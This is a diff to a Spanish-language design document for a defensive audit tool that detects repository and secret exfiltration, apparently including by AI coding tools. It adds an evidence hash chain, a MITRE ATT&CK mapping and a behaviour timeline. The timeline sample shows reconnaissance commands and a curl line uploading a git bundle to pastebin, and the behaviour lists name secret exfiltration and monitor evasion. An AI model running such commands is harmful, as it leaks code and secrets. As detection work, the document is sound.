@@ -21,7 +21,10 @@
 12. [Limitaciones Actuales](#12-limitaciones-actuales)
 13. [Próximas Capas de Evolución](#13-próximas-capas-de-evolución)
 14. [Anti-Evasion Score](#14-anti-evasion-score)
-15. [Mutation Lab para Comportamiento](#15-mutation-lab-para-comportamiento)
+15. [Evidence Hash Chain](#19-evidence-hash-chain)
+16. [MITRE ATT&CK Mapping](#20-mitre-attack-mapping)
+17. [Behavior Timeline](#21-behavior-timeline)
+18. [Mutation Lab para Comportamiento](#22-mutation-lab-para-comportamiento)
 
 ---
 
@@ -1032,7 +1035,145 @@ computeAntiEvasionScore(context: AuditContext): number {
 
 ---
 
-## 19. Mutation Lab para Comportamiento
+## 19. Evidence Hash Chain
+
+### Concepto
+
+Cada `Evidence` en una sesión de auditoría se encadena criptográficamente mediante SHA-256:
+
+```
+Evento 0
+  timestamp
+  evidenceId
+  evidenceType
+  summary
+  previousHash = null
+  hash = SHA256(index + timestamp + evidenceId + type + summary + "")
+
+Evento 1
+  previousHash = hash0
+  hash = SHA256(index + timestamp + evidenceId + type + summary + hash0)
+```
+
+### Implementación
+
+**Archivo**: `src/core/network/evidence-chain-crypto.ts`
+
+- `buildEvidenceChain(evidence[]): EvidenceRecord[]` — ordena por timestamp, calcula hashes encadenados
+- `verifyEvidenceChain(records[]): EvidenceChainVerification` — recalcula cada hash y valida contra el almacenado
+
+### Integración
+
+La cadena se genera en `pipeline.generateVerdict()` y se incluye en el `Verdict` como `evidenceChain` + `evidenceChainVerification`.
+
+### Exportación
+
+Al exportar una sesión, el reporte incluye:
+
+```
+Evidence verified
+  ✓ 542 records
+  ✓ chain valid
+  ✓ no tampering detected
+  first hash: a1b2c3d4...
+  last hash:  e5f6g7h8...
+```
+
+### Seguridad
+
+- Cualquier modificación de un registro existente invalida su hash
+- La modificación del previousHash rompe el encadenamiento
+- No se puede reordenar la cadena sin romper todos los hashes posteriores
+
+---
+
+## 20. MITRE ATT&CK Mapping
+
+### Concepto
+
+Cada `BehaviorType` se mapea a una técnica y táctica de MITRE ATT&CK para enriquecer los reportes con un marco de seguridad estándar.
+
+### Mapeo completo
+
+| Behavior | Técnica MITRE | Táctica |
+|---|---|---|
+| `repo_indexed`, `git_history_read`, `git_objects_read` | T1213 — Data from Information Repositories | Collection |
+| `git_bundle_created` | T1074 — Data Staged | Collection |
+| `git_bundle_uploaded`, `code_upload`, `secrets_exfiltrated`, `canary_exfiltrated`, `fake_secret_exfiltrated` | T1041 — Exfiltration Over C2 Channel | Exfiltration |
+| `git_archive_created` | T1560 — Archive Collected Data | Collection |
+| `secrets_scanned`, `fake_secret_read` | T1555 — Credentials from Password Stores | Credential Access |
+| `embeddings_generated`, `mass_file_read`, `canary_read`, `contaminated_git_read`, `evidence_chain_detected` | T1005/T1213 — Data from Local System / Repositories | Collection |
+| `full_repo_snapshot` | T1074 — Data Staged | Collection |
+| `suspicious_connection`, `ai_prompt_sent` | T1071 — Application Layer Protocol | Command and Control |
+| `dns_suspicious`, `tls_suspicious` | T1572 — Protocol Tunneling | Command and Control |
+| `process_suspicious`, `process_chain_detected` | T1059 — Command and Scripting Interpreter | Execution |
+| `anti_evasion_detected` | T1564 — Hide Artifacts | Defense Evasion |
+| `monitor_awareness_detected` | T1497 — Virtualization/Sandbox Evasion | Defense Evasion |
+| `monitor_disabled` | T1562 — Impair Defenses | Defense Evasion |
+| `preparation_detected`, `pre_operational_snapshot_detected` | T1590 — Gather Victim Network Information | Reconnaissance |
+| `canary_modified` | T1565 — Data Manipulation | Impact |
+| `prompt_injection_attempt` | T1567 — Exfiltration Over Web Service | Exfiltration |
+
+### Implementación
+
+**Archivo**: `src/core/network/mitre-attack.ts`
+
+- `getMitreMapping(type): MitreAttackMapping` — mapeo individual
+- `buildMitreMappings(types[]): MitreAttackMapping[]` — construye lista deduplicada
+
+### Reporte
+
+El reporte de sesión incluye cobertura ATT&CK:
+
+```
+ATT&CK Coverage
+  Collection    ✓ (T1213, T1074, T1560)
+  Exfiltration  ✓ (T1041, T1567)
+  Defense Evasion ✓ (T1564, T1497, T1562)
+  Reconnaissance  ✓ (T1590)
+```
+
+---
+
+## 21. Behavior Timeline
+
+### Concepto
+
+Los behaviors se organizan en una línea de tiempo por etapas:
+
+```
+Preparation → Collection → Packaging → Exfiltration
+```
+
+Cada behavior se asigna a una etapa según su propósito:
+
+| Etapa | Behaviors |
+|---|---|
+| Preparation | `preparation_detected`, `pre_operational_snapshot_detected` |
+| Collection | `git_history_read`, `git_objects_read`, `mass_file_read`, `secrets_scanned`, `embeddings_generated`, `full_repo_snapshot`, `canary_read`, `fake_secret_read` |
+| Packaging | `git_bundle_created`, `git_archive_created` |
+| Exfiltration | `code_upload`, `git_bundle_uploaded`, `secrets_exfiltrated`, `canary_exfiltrated`, `fake_secret_exfiltrated` |
+
+### Implementación
+
+**Archivo**: `src/core/network/mitre-attack.ts`
+
+- `getBehaviorStage(type): Stage` — clasifica un behavior en Preparation/Collection/Packaging/Exfiltration/Other
+- `buildBehaviorTimeline(behaviors[]): Stage[]` — construye timeline ordenado por etapa
+
+### Reporte
+
+```
+Timeline
+  [Preparation]  whoami, ipconfig, nslookup
+  [Collection]   git rev-list --all, git cat-file
+  [Packaging]    git bundle create
+  [Exfiltration] curl --data-binary @repo.bundle https://pastebin.com
+```
+
+---
+
+## 22. Mutation Lab para Comportamiento
 
 Extender la filosofía de Mutation Lab (actualmente para scanner de PRs) al dominio de comportamiento de red.
 
